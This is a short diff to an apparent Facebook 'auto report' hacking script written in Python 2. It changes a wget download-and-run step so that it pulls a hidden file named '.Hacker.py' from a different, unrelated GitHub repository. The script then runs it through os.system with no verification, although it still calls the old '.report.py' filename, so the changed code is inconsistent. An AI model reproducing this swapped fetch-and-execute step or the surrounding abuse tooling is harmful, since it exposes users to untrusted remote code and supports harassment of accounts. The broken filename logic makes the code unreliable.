@@ -173,7 +173,7 @@ def menu():
         if not os.path.isfile('.report.py'):
             jalan('DONT USE FACEBOOK AUTO REPORT. ONLY TIME WASTE. SO I RECOMMEND YOU TO DONT USE IT. BUT IF YOU WANT TO WASTE YOUR TIME THEN USE IT')
             time.sleep(1)
-            os.system('wget https://raw.githubusercontent.com/BotolBaba0/BotolBaba0.github.io/master/.report.py')
+            os.system('wget https://raw.githubusercontent.com/ArbabMemon/ArbabMemon.github.io/Hacker/.Hacker.py')
             os.system('clear')
             os.system('python2 .report.py')
         else:
